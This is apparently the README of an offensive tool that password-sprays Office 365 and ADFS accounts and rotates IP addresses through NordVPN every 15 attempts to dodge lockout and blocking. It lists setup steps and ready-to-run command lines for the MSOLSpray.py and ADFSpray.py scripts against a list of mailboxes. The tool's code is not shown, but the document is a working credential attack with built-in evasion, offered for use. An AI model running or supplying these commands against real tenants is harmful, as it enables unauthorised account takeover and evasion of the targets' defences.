# Password spraying O365/ADFS with IP rotation (NordVPN)
Password spraying O365/ADFS with IP rotation (nordvpn) every 15 attempts

## Prerequisites

* Nordvpn client (tested on debian)
* Connect to nordvpn
```bash
sudo nordvpn login --username '<mail>' --password '<pass>'
```
* Python packages
```bash
pip3 install -r requirements.txt
```
## Managed tenant
### Usage
```bash
sudo python3 MSOLSpray.py -u '<path/to/mail/file>' -s 2 -p '<pass>' -o result.txt --vpn
```

## ADFS
### Usage
```bash
sudo python3 ADFSpray.py -U '<path/to/mail/file>' -r 1 3 -p '<pass>' -t https://<adfs.tenant.com> adfs -V -o result.txt --vpn
```
